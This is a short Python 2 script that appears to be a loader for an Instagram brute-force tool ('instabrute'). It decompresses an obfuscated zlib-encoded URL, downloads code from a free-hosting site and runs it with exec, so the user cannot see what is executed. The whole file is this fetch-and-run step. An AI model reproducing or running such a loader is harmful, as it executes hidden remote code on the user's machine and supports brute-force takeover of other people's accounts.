try:
    import requests, zlib
except:
    print '[+] requests module not found'
    exit()
else:
    try:
        import bs4
    except:
        print '[+] bs4 module not found'
        exit()

    # https://komenk.000webhostapp.com/instabrute/source-code.txt
    url = 'x\x9c\r\xc6A\x0e\x800\x08\x04\xc0\x17\t\x9c\xfd\x8d\xa5$5M\x0b)\xdb\xe8\xf3uN\xd3\x80\xc8\x93\xb9\xfb\xb0\xd9ID\x1e+\xcd\x13W\x04\xa9\x0f\xbe\xe7\xff\xb26\x8c\xd3\xf7R;\xd4\xab\x11^|\x8f\x07\x16?'
    try:
        sc = requests.get(zlib.decompress(url)).content
    except:
        print '[+] Sinyal Error'
        exit()

exec sc
